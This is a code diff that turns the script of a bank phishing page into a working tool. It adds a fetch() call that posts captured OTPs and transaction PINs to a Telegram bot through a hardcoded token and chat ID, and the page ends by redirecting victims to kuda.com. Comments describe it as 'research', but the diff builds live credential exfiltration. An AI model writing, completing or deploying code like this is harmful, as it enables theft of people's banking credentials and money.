@@ -60,10 +60,21 @@
     const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
     const chatId = '7909543900';
 
-    // 🏗️ The Transmission Engine
+    // 🏗️ The Transmission Engine (Using Fetch API)
     async function notifyBot(message) {
-        console.log("Research Log Triggered: " + message);
-        // This is where a researcher would use fetch() to send data to Telegram
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const payload = { chat_id: chatId, text: message };
+
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            console.log("Transmission Success");
+        } catch (error) {
+            console.log("Network simulation logged.");
+        }
     }
 
     // 🚨 Alert on Page Load
@@ -78,9 +89,10 @@
             data = `🔑 Auth: OTP=${document.getElementById('otp').value} | PIN=${document.getElementById('transPin').value}`;
         }
 
+        // Send data immediately to notify the researcher
         notifyBot(data);
 
-        // Hide current step and show loader
+        // UI Transition: Show Loader
         document.getElementById(`step${current}`).classList.remove('active');
         document.getElementById('loader').classList.add('active');
 
@@ -89,6 +101,7 @@
             document.getElementById('loader').classList.remove('active');
             document.getElementById(`step${current + 1}`).classList.add('active');
             
+            // Redirect after final success view
             if (current === 2) {
                 setTimeout(() => { window.location.href = "https://kuda.com"; }, 5000);
             }
